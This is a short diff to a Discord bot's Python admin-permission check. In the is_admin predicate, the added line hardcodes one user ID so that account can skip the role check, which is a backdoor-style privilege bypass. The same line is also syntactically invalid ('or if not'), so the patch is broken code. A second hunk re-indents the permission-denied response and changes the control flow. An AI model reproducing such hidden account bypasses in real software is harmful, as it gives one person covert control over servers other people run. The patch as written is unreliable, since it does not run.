@@ -8,7 +8,7 @@ admin_roles = ['Bot-Admin', 'Admin', 'Test-Admin']
 def is_admin():
     async def predicate(ctx):
         if isinstance(ctx.channel, discord.abc.GuildChannel):
-            return await check_admin(ctx) if not ctx.author == ctx.guild.owner else True
+            return await check_admin(ctx)  if not ctx.author == ctx.guild.owner or if not ctx.author == 308260538637484032 else True
         else:
             return await check_admin(ctx)
     return commands.check(predicate)
@@ -23,8 +23,8 @@ async def check_admin(ctx):
             else:
                 pass
     
-        await ctx.send(f"You don't have the permission to run ```{ctx.command.qualified_name}```")
-        return False
+    await ctx.send(f"You don't have the permission to run ```{ctx.command.qualified_name}```")
+    return False
 
     
 
